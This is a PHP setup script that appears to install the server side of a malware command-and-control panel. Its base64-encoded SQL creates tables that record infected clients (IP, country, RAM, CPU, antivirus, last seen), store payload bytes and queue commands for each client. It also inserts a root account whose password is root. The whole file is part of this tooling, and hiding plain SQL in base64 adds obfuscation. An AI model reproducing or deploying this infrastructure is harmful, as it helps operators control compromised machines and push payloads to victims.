<?php

session_start();
session_unset();
session_destroy();


function CreateUsers($connection)
{
    $SqlCreateUsers = base64_decode("Q1JFQVRFIFRBQkxFIGBVc2Vyc2AgKAoJYElkYCBJTlQgTk9UIE5VTEwgQVVUT19JTkNSRU1FTlQsCglgVXNlcm5hbWVgIFZBUkNIQVIoNjApIE5PVCBOVUxMLAoJYFBhc3N3b3JkYCBWQVJDSEFSKDYwKSBOT1QgTlVMTCwKCVBSSU1BUlkgS0VZIChgSWRgKQopOw==");
    
    try
    {
        $connection->exec($SqlCreateUsers);
    }
    catch(Exception $ex)
    {
        echo("<div class=\"notification is-danger\">Unable to create the users table.</div>");

        return false;
    }    

    return true;
}

function CreateClients($connection)
{
    $SqlCreateClients = base64_decode("Q1JFQVRFIFRBQkxFIGBDbGllbnRzYCAoCglgSWRgIElOVCBOT1QgTlVMTCBBVVRPX0lOQ1JFTUVOVCwKCWBJcGAgVkFSQ0hBUigyNCkgTk9UIE5VTEwsCglgQ291bnRyeWAgVkFSQ0hBUigxMikgTk9UIE5VTEwsCglgUmFtYCBWQVJDSEFSKDEyKSBOT1QgTlVMTCwKCWBMYXN0U2VlbmAgVElNRVNUQU1QIE5PVCBOVUxMIE9OIFVQREFURSBDVVJSRU5UX1RJTUVTVEFNUCBERUZBVUxUIENVUlJFTlRfVElNRVNUQU1QLAoJYENQVWAgVkFSQ0hBUigyNTUpIE5PVCBOVUxMLAoJYEFudGlWaXJ1c2AgVkFSQ0hBUigyNTUpIE5PVCBOVUxMLAoJUFJJTUFSWSBLRVkgKGBJZGApCik7");
    
    try
    {
        $connection->exec($SqlCreateClients);
    }
    catch(Exception $ex)
    {
        echo("<div class=\"notification is-danger\">Unable to create the clients table.</div>");

        return false;
    }

    return true;
}

function CreatePayloads($connection)
{
    $SqlCreatePayload = base64_decode("Q1JFQVRFIFRBQkxFIGBQYXlsb2Fkc2AgKAoJYElkYCBJTlQgTk9UIE5VTEwgQVVUT19JTkNSRU1FTlQsCglgTmFtZWAgVkFSQ0hBUigxNikgTk9UIE5VTEwsCglgUGF5bG9hZEJ5dGVzYCBCTE9CLAoJUFJJTUFSWSBLRVkgKGBJZGApCik7");
    
    try
    {
        $connection->exec($SqlCreatePayload);
    }
    catch(Exception $ex)
    {
        echo("<div class=\"notification is-danger\">Unable to create the payloads table.</div>");

        return false;
    }

    return true;
}

function CreateCommands($connection)
{
    $SqlCreateCommands = base64_decode("Q1JFQVRFIFRBQkxFIGBDb21tYW5kYCAoCglgSWRgIElOVCBOT1QgTlVMTCwKCWBDbGllbnRfSWRgIElOVCBOT1QgTlVMTCwKCWBDb21tYW5kYCBWQVJDSEFSKDE2KSBOT1QgTlVMTCwKCVBSSU1BUlkgS0VZIChgSWRgKQopOw==");
    try
    {
        $connection->exec($SqlCreateCommands);
    }
    catch(PDOException $ex)
    {
        echo("<div class=\"notification is-danger\">Unable to create the commands table</div>");

        return false;
    }

    return true;
}

function InsertUser($connection)
{
    $SqlInsertUser = base64_decode("SU5TRVJUIElOVE8gYHVzZXJzYCAoYElkYCwgYFVzZXJuYW1lYCwgYFBhc3N3b3JkYCkgVkFMVUVTIChOVUxMLCAncm9vdCcsICckMnkkMTAkbE1hTzdsdTZFNlpLTkJIM3N3cVFLLmxVWno3VUJOVW44T3RnZW43L3NKNVRFTW9RRWtJTXUnKTs=");
    try
    {
        $connection->exec($SqlInsertUser);        
    }
    catch(PDOException $ex)
    {
        echo("<div class=\"notification is-danger\">Unable to insert the root user</div>");

        return false;
    }

    return true;
}

?>




<!DOCTYPE html>
<html lang="en">
<head>
    <?php include './includes/head.php';?>
</head>
<body>
    <header>
        <?php include 'includes/header.php';?>
    </header>
    <main>
        <div class="container">
            <form action="set-command.php" method="post">
                <section class="section">
                    <?php include './database/db-conn.php'?>
                    <div class="columns is-centered">
                        <div class="column is-6">
                            <div class="notification is-primary">
                                <p>Attempting to create new tables and insert the root user</p>
                            </div>
                            <?php                                                                 
                                try
                                {
                                    $stmt = $dbconn->prepare("SELECT * FROM Users");
                                    $stmt->execute();

                                    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
                                }
                                catch(PDOException $ex)
                                {
                                    if(CreateClients($dbconn) && CreatePayloads($dbconn) && CreateUsers($dbconn) && InsertUser($dbconn) && CreateCommands($dbconn))
                                    {
                                        echo("<div class=\"notification is-primary\">Succesfully created the Users, Clients and Payload table. <br> 
                                        You may now login using <br> 
                                        Username: root <br> 
                                        Password: root 
                                        </div>");
                                    }
                                }
                            ?>
                            <div class="notification is-warning">
                                <p>Rememer to remove the setup.php from your webserver after running this script.</p>
                            </div>
                        </div>
                    </div>
                </section>
            </form>
        </div>
    </main>
    <script type="text/javascript" src="./js/menu.js"></script>
</body>

</html>